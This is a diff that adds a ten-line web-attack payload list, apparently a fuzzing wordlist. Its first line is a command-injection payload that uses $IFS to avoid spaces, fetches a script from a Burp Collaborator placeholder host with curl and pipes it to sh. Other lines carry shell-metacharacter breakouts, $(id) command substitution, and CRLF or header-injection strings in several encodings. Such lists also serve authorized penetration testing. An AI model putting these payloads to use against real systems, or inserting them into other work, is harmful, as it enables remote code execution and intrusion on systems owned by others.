@@ -1,0 +1,10 @@
+'`curl$IFS@BURPCOLLABORATOR|sh`'$(curl$IFS@BURPCOLLABORATOR|sh)
+'"%&>[${$(`;\
+$(id)
+1%c4%8d%c4%8aasd:asd
+1%0d%0aasd:asd
+1%u2028a
+1%2029a
+1%C0%8D%C0%8Asd
+1%c4%8aasd
+1%EA%A8%8Aasd
